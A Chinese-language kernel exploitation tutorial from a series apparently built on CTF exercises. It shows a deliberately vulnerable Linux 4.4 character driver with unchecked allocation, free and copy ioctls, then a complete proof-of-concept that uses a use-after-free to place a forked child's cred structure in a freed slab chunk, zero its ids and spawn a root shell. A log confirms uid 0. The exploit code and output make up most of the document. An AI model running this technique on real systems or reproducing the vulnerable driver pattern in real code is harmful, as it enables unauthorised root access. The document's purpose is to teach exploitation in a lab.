# how2kernel————第七节UAF修改cred

> 内核版本：Linux4.4.72
>
> 文件：[heap_cred.tar](https://raw.githubusercontent.com/fangdada/kernelPWN/master/how2kernel/06UAF_cred/UAF_cred.tar)

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>同样用了[jinyu00](https://gitee.com/hac425/kernel_ctf)的例子，这题跟heap_bof那题基本一样，只是不同之处就是这题的利用方式从修改tty_operations变成了直接修改cred，跟上个例子一样，直接把一系列id都覆盖为0就行了。怎么修改呢？UAF，我们都知道了heap_bof那个例子漏洞特别多，无论是溢出还是直接编辑都可以，那么怎么通过修改堆块来修改cred呢？那就是**让cred结构体变成堆块**！</font></br>

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>当**fork一个子进程时，内核会给cred分配空间，也就是分配一个0xa8大小的堆块**，我们又知道slub算法会向上取整，除了**两个特殊的组，0xC0和0x60，**也就是说fork一个子进程时会分配一个0xC0大小的空间给他，那么通过UAF我们这不就是把cred搞到手了吗？不多说，自己看代码，比较简单的：</font></br>

**heap_bof.c**

```C
#include <linux/module.h>
#include <linux/types.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/errno.h>
#include <linux/cdev.h>
#include <asm/uaccess.h>
#include <linux/device.h>
#include<linux/slab.h>
#include<linux/string.h>

struct class *bof_class;
struct cdev cdev;
char *p;
int bof_major=248;

char *ptr[40];


struct param
{
    size_t len;
    char* buf;
    unsigned long idx;
};

long bof_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)
{

    struct param* p_arg;
    p_arg = (struct param*)arg;
    int retval = 0;
    switch (cmd) {
        case 9:
            copy_to_user(p_arg->buf, ptr[p_arg->idx], p_arg->len);
            printk("copy_to_user: 0x%x\n", *(long *)ptr[p_arg->idx]);
            break;
        case 8:
            copy_from_user(ptr[p_arg->idx], p_arg->buf, p_arg->len);
            break;
        case 7:
            kfree(ptr[p_arg->idx]);
            printk("free: 0x%p\n", ptr[p_arg->idx]);
            break;
        case 5:
            ptr[p_arg->idx] = kmalloc(p_arg->len, GFP_KERNEL);
            printk("alloc: 0x%p, size: %2x\n", ptr[p_arg->idx], p_arg->len);
            break;

        default:
            retval = -1;
            break;
    }

    return retval;
}

static const struct file_operations bof_fops = {
    .owner = THIS_MODULE,
    .unlocked_ioctl = bof_ioctl,
};

static int bof_init(void)
{
    
    dev_t devno = MKDEV(bof_major, 0);
    int result;

    if (bof_major)
        result = register_chrdev_region(devno, 1, "bof");
    else{
        result = alloc_chrdev_region(&devno, 0, 1, "bof");
        bof_major = MAJOR(devno);
    }
    printk("bof_major /dev/bof: %d\n", bof_major);

    if (result < 0)
        return result;

    bof_class = class_create(THIS_MODULE, "bof");
    device_create(bof_class, NULL, devno, NULL, "bof");

    cdev_init(&cdev, &bof_fops);
    cdev.owner = THIS_MODULE;
    cdev_add(&cdev, devno, 1);
    return 0;
}

static void bof_exit(void)
{
    cdev_del(&cdev);
    device_destroy(bof_class, MKDEV(bof_major, 0));
    class_destroy(bof_class);
    unregister_chrdev_region(MKDEV(bof_major, 0), 1);
    printk("bof exit success\n");
}

MODULE_AUTHOR("exp_ttt");
MODULE_LICENSE("GPL");

module_init(bof_init);
module_exit(bof_exit);
```

**poc.c**

```C
#include <stdio.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
struct param
{
    size_t len;
    char* buf;
    unsigned long idx;
};
int main(void)
{
    int fds[10];
    int ptmx_fds[0x100];
    char buf[8];
    int fd;
    for (int i = 0; i < 10; ++i)
    {
        fd = open("/dev/bof", O_RDWR);
        if (fd == -1) {
            printf("open bof device failed!\n");
            return -1;
        }
        fds[i] = fd;
    }
    struct param p;
    p.len = 0xa8;
    p.buf = malloc(p.len);

    for (int i = 0; i < 10; ++i)
    {
        p.idx = 1;
        ioctl(fds[0], 5, &p);  // malloc
    }
    printf("clear heap done\n");

    for (int i = 0; i < 10; ++i)
    {
        p.idx = i;
        ioctl(fds[i], 5, &p);  // malloc
    }
    p.idx = 5;
    ioctl(fds[5], 7, &p); // free
    int now_uid;

    int pid = fork();
    if (pid < 0) {
        perror("fork error");
        return 0;
    }
    p.idx = 4;
    p.len = 0xc0 + 0x30;
    memset(p.buf, 0, p.len);
    ioctl(fds[4], 8, &p);    
    if (!pid) {
        now_uid = getuid();
        printf("uid: %x\n", now_uid);
        if (!now_uid) {
            // printf("get root done\n");

            system("/bin/sh");
        } else {
            // puts("failed?");

        }
    } else {
        wait(0);
    }
    getchar();
    return 0;
}
```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>最终效果如下：</font></br>

```shell
/mytest # ./makeuser.sh 
[    3.857858] bof_major /dev/bof: 248
passwd: unknown uid 0
/mytest $ ./poc
[    4.843015] alloc: 0xffff880000a20a80, size: a8
[    4.843879] alloc: 0xffff880000a20b40, size: a8
[    4.844008] alloc: 0xffff880000a51000, size: a8
[    4.844110] alloc: 0xffff880000a510c0, size: a8
[    4.844231] alloc: 0xffff880000a51180, size: a8
[    4.844336] alloc: 0xffff880000a51240, size: a8
[    4.844435] alloc: 0xffff880000a51300, size: a8
[    4.844500] alloc: 0xffff880000a513c0, size: a8
[    4.844564] alloc: 0xffff880000a51480, size: a8
[    4.844627] alloc: 0xffff880000a51540, size: a8
clear heap done
[    4.847132] alloc: 0xffff880000a516c0, size: a8
[    4.847358] alloc: 0xffff880000a51780, size: a8
[    4.847472] alloc: 0xffff880000a51840, size: a8
[    4.847573] alloc: 0xffff880000a51900, size: a8
[    4.847685] alloc: 0xffff880000a519c0, size: a8
[    4.847795] alloc: 0xffff880000a51a80, size: a8
[    4.847903] alloc: 0xffff880000a51b40, size: a8
[    4.848011] alloc: 0xffff880000a51c00, size: a8
[    4.848783] alloc: 0xffff880000a51cc0, size: a8
[    4.849085] alloc: 0xffff880000a51d80, size: a8
[    4.849508] free: 0xffff880000a51a80
uid: 0
/mytest # 
```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>（因为这不是真实环境，我看到内存碎片比较少之后就把clear heap目的的循环次数减小了。）</font></br>
